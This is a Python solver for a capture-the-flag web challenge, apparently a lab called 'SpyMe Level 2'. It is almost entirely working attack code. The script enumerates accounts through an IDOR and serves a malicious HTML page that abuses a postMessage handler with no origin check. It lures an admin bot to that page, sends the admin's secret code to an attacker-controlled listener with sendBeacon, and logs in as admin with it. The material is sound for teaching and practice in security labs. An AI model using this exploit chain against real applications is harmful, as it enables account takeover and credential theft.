"""
Solver for SpyMe Level 2.

Vulnerability: the React `/account` page installs a `message` listener with no
`event.origin` check. It accepts `{type: "FETCH_USER_INFO", userId}` from *any*
window and replies with the JSON response of `/api/account_info/<id>` -
including the target's `secret_code` whenever the *requester* is an admin.

The admin bot (`admin-bot` service) logs itself in as the real `admin` user and
then visits whatever URL the web app's "Spy on Someone" feature
(`POST /api/spy_on`) hands it. If we get the bot to open our own HTML page, we
can: pop open `http://web:3000/account` (inheriting the bot's authenticated,
admin cookie in that same browser), postMessage a `FETCH_USER_INFO` request
for the admin's own user id (leaked earlier through the classic level-1 IDOR
on `/api/account_info`), and have the page postMessage the admin's
`secret_code` straight back to us. We exfiltrate it with `navigator.sendBeacon`
to a tiny HTTP server we run ourselves, then log in as `admin` to retrieve the
flag.
"""

import base64
import json
import os
import socket
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import httpx

LISTENER_PORT = 8080

EXPLOIT_PAGE = """<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Exploit for SpyMe Level 2</title>
</head>
<body>
<h1>Exploit for SpyMe Level 2</h1>
<script>
    EXPLOIT_SERVER_URL = "{listener_url}";
    BASE_URL = "http://web:3000";

    var exp_win = window.open(BASE_URL + "/account");
    setTimeout(function () {{
        var exp_message = {{
            type: "FETCH_USER_INFO",
            userId: {admin_id}
        }};
        exp_win.postMessage(exp_message, "*");
    }}, 4000);

    window.addEventListener("message", function (event) {{
        navigator.sendBeacon(EXPLOIT_SERVER_URL + "/exfil", JSON.stringify(event.data));
    }});
</script>
</body>
</html>
"""


class Listener:
    """Serves the exploit page and captures the postMessage exfil beacon."""

    def __init__(self, admin_id: int):
        self.exfil = None
        self.received = threading.Event()
        page = EXPLOIT_PAGE.format(
            listener_url=f"http://{{host}}:{LISTENER_PORT}",
            admin_id=admin_id,
        )
        owner = self

        class Handler(BaseHTTPRequestHandler):
            def log_message(self, fmt, *args):
                print(f"[listener] {self.address_string()} - {fmt % args}", file=sys.stderr)

            def do_GET(self):
                if self.path == "/exploit.html":
                    body = owner.page.encode()
                    self.send_response(200)
                    self.send_header("Content-Type", "text/html")
                    self.send_header("Content-Length", str(len(body)))
                    self.end_headers()
                    self.wfile.write(body)
                else:
                    self.send_response(404)
                    self.end_headers()

            def do_POST(self):
                if self.path == "/exfil":
                    length = int(self.headers.get("Content-Length", 0))
                    body = self.rfile.read(length)
                    print(f"[listener] exfil received: {body!r}")
                    owner.exfil = body
                    owner.received.set()
                    self.send_response(204)
                    self.end_headers()
                else:
                    self.send_response(404)
                    self.end_headers()

        self.page = page
        self.server = ThreadingHTTPServer(("0.0.0.0", LISTENER_PORT), Handler)
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)

    def start(self):
        self.thread.start()

    def set_host(self, host: str):
        self.page = self.page.replace("{host}", host)

    def wait_for_exfil(self, timeout: float) -> bytes:
        if not self.received.wait(timeout):
            raise TimeoutError("did not receive exfiltrated postMessage data in time")
        return self.exfil

    def stop(self):
        self.server.shutdown()


def random_identity() -> dict:
    import random
    import string

    def token(n):
        return "".join(random.choices(string.ascii_letters + string.digits, k=n))

    return {"username": token(12), "firstName": token(12), "lastName": token(12)}


def own_reachable_ip(target_host: str, target_port: int) -> str:
    """The IP by which `target_host` (and, symmetrically, our own listener) is reachable."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((target_host, target_port))
        return s.getsockname()[0]
    finally:
        s.close()


def encode_id(user_id: int) -> str:
    return base64.b64encode(json.dumps({"id": user_id}).encode()).decode()


def exploit(base_url: str):
    client = httpx.Client(base_url=base_url, verify=False, follow_redirects=True, timeout=30)

    # Register + log in as a throwaway agent to get an authenticated session.
    identity = random_identity()
    r = client.post("/api/register", json=identity)
    assert r.is_success, f"registration failed: {r.text}"
    secret_code = r.json()["secretCode"]

    r = client.post(
        "/api/login",
        json={"username": identity["username"], "secretCode": secret_code},
    )
    assert r.is_success, f"login failed: {r.text}"
    print(f"[*] Registered and logged in as {identity['username']}")

    # Classic level-1 IDOR: walk /api/account_info to find the admin's user id
    # and, separately, a secret_code for a whitelisted ("is_allowed_spy") user.
    admin_id = None
    spy_username = None
    spy_secret = None
    for uid in range(1, 301):
        r = client.get(f"/api/account_info/{encode_id(uid)}")
        if not r.is_success:
            continue
        data = r.json()
        username = data.get("username")
        if username == "admin":
            admin_id = uid
            print(f"[*] Leaked admin user id: {admin_id}")
        elif username in ("icvorovic", "mnikic") and data.get("secret_code"):
            spy_username = username
            spy_secret = data["secret_code"]
            print(f"[*] Leaked spy-enabled account: {spy_username}")

    assert admin_id is not None, "could not find the admin's user id via IDOR"
    assert spy_secret is not None, "could not find a whitelisted spy account via IDOR"

    # Log in as the whitelisted spy account so we're allowed to use /api/spy_on.
    r = client.post("/api/login", json={"username": spy_username, "secretCode": spy_secret})
    assert r.is_success, f"spy account login failed: {r.text}"
    print(f"[*] Logged in as whitelisted spy account {spy_username}")

    # Figure out our own address, reachable by the admin bot on the same cluster network.
    web_host, web_port = base_url.replace("http://", "").split(":")
    my_ip = own_reachable_ip(web_host, int(web_port))
    print(f"[*] Our listener is reachable at {my_ip}:{LISTENER_PORT}")

    listener = Listener(admin_id)
    listener.set_host(my_ip)
    listener.start()

    exploit_url = f"http://{my_ip}:{LISTENER_PORT}/exploit.html"
    r = client.post("/api/spy_on", json={"url": exploit_url})
    assert r.is_success, f"spy_on request failed: {r.text}"
    print(f"[*] Reported {exploit_url} to the admin bot: {r.json()}")

    raw = listener.wait_for_exfil(timeout=60)
    listener.stop()

    message = json.loads(raw)
    assert not message.get("error"), f"leaked postMessage carried an error: {message}"
    leaked = message["data"]
    assert leaked.get("username") == "admin", f"unexpected leaked user: {leaked}"
    admin_secret = leaked["secret_code"]
    print(f"[*] Leaked admin secret_code: {admin_secret}")

    r = client.post("/api/login", json={"username": "admin", "secretCode": admin_secret})
    assert r.is_success, f"admin login failed: {r.text}"
    login_data = r.json()
    assert "flag" in login_data, f"admin login did not return a flag: {login_data}"
    print(f"[*] Flag: {login_data['flag']}")


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("SERVICE_WEB_HTTP_ENDPOINT")
    assert target, "usage: solve.py <base_url>"
    exploit(target)
